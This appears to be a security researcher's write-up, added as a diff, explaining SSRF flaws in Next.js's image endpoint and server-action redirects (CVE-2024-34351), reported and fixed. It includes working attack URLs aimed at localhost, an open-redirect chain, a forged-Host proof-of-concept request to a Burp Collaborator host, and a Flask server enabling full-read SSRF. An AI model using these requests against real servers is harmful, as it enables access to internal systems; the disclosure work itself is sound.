@@ -1,0 +1,151 @@
+#The _next/image Component
+
+NextJS has an image optimization component built in and enabled by default. The idea is straightforward; if you have a large image duck.jpg which you want to serve in a smaller size, or serve in a dynamic size, it would be wasteful to send the (possibly multi megabyte) image to the client and resize it using HTML; instead, you can write something in your React like:
+
+<Image
+  src="/duck.jpg"
+  width={256}
+  quality={75}
+  alt="Picture of a duck"
+/>
+And it will be served to the client at the correct size. In addition, it can be cached, meaning the server does not have to resize the image on every request.
+
+How does this work behind the scenes? In reality, NextJS exposes an api endpoint _next/image, which can then be used like follows:
+
+https://example.com/_next/image?url=/duck.jpg&w=256&q=75
+
+Of course, it's common to want to serve images from other domains. NextJS provides the remotePatterns functionality in the next.config.js file to do just that; by specifying a config item like:
+
+    images: {
+        remotePatterns: [
+            {
+                protocol: 'https',
+                hostname: 'cdn.example.com',
+            },
+            {
+                protocol: 'https',
+                hostname: 'third-party.com',
+            },
+        ],
+    },
+You can now load images from cdn.example.com and third-party.com:
+
+https://example.com/_next/image?url=https://cdn.example.com/i/rabbit.png&w=256&q=75 (Blind SSRF Attack)
+
+
+f you were a developer and you wanted to load an image from any site, you may simply whitelist every URL:
+
+  images: {
+    remotePatterns: [
+		{
+			protocol: "https",
+			hostname: "**",
+		},
+		{
+			protocol: "http",
+			hostname: "**",
+		},
+    ],
+  },
+This may seem ludicrous, but it's not that uncommon, especially since it's not clear that this is dangerous. However, this opens you up to a blind SSRF attack - you can simply load any local URL like:
+
+https://example.com/_next/image?url=https://localhost:2345/api/v1/x&w=256&q=75 (Blind SSRF Attack)
+
+
+A more common scenario is that some specific domains are whitelisted. However, the image renderer follows redirects. Thus if you were to find any open redirect on a whitelisted domain, you can turn this into a blind SSRF. For example, suppose third-party.com was whitelisted and you found an open redirect at third-party.com/logout?url=foo. You could then hit an internal server with SSRF with a request like:
+
+https://example.com/_next/image?url=https://third-party.com/logout%3furl%3Dhttps%3A%2F%2Flocalhost%3A2345%2Fapi%2Fv1%2Fx&w=256&q=75
+
+Cause: Open Redirect, Attack: Blind SSRF Attack
+
+What is interesting is that instead of returning the redirect directly to the client, if the redirect starts with / (for example, a redirect to /login) the server will fetch the result of the redirect _server side_, then return it back to the client. However, looking closely, we see that the Host header is taken from the client:
+
+const host = req.headers['host']
+const proto =
+  staticGenerationStore.incrementalCache?.requestProtocol || 'https'
+const fetchUrl = new URL(`${proto}://${host}${basePath}${redirectUrl}`)
+This means that if we forge a host header pointing to an internal host, NextJS will try and fetch the reponse from that host instead of the app itself, leading to an SSRF.
+
+To recap, to be vulnerable to this SSRF, we require that:
+
+- A server action is defined;
+
+- The server action redirects to a URL starting with /;
+
+- We are able to specify a custom Host header while accessing the application.
+
+Let's run through a simple example locally. Suppose we have an app with a simple search function that only works if the user is logged in:
+
+"use server";
+
+import { redirect } from "next/navigation";
+
+export const handleSearch = async (data: FormData) => {
+  if (!userIsLoggedIn()) {
+    redirect("/login");
+    return;
+  }
+  // .. do other stuff ..
+};
+
+function userIsLoggedIn() {
+  return false;
+}
+‍
+
+If we send a request to this search endpoint via the UI, we can intercept the request and see its structure
+
+The important thing here is the Next-Action ID. This is used by NextJS to uniquely identify the action we want to take. In fact, the URL and path does not matter at all - as long as we pass the Next-Action header, we'll trigger the action.
+
+To trigger the bug, let's use this Next-Action ID to create a minimal PoC:
+
+POST /x HTTP/1.1
+Host: kwk4ufof0q3hdki5e46mpchscjia69uy.oastify.com
+Content-Length: 4
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
+Next-Action: 15531bfa07ff11369239544516d26edbc537ff9c
+Connection: close
+
+{}
+Note that here, we have changed our host to our Burp Collaborator instance. And indeed, we can see we get a ping back - here's the request that NextJS sends to us:
+
+HEAD /login HTTP/1.1
+host: kwk4ufof0q3hdki5e46mpchscjia69uy.oastify.com
+connection: close
+cache-control: no-cache, no-store, max-age=0, must-revalidate
+cookie: ; undefined
+next-action: 15531bfa07ff11369239544516d26edbc537ff9c
+rsc: 1
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
+vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Url
+x-action-redirect: /login
+x-action-revalidated: [[],0,0]
+x-forwarded-for: ::ffff:127.0.0.1
+x-forwarded-host: kwk4ufof0q3hdki5e46mpchscjia69uy.oastify.com
+x-forwarded-port: 3000
+x-forwarded-proto: http
+accept: */*
+accept-language: *
+sec-fetch-mode: cors
+accept-encoding: gzip, deflate
+
+
+Here's a simple Flask example:
+
+from flask import Flask, Response, request, redirect
+app = Flask(__name__)
+
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>')
+def catch(path):
+    if request.method == 'HEAD':
+        resp = Response("")
+        resp.headers['Content-Type'] = 'text/x-component'
+        return resp
+    return redirect('https://example.com')
+
+Changing our Host header to point to our malicious Flask server then gives us the full content of example.com (Full Read SSRF)
+
+We reported this SSRF to NextJS and it was fixed in v14.1.1.
+
+This vulnerability was assigned CVE-2024-34351
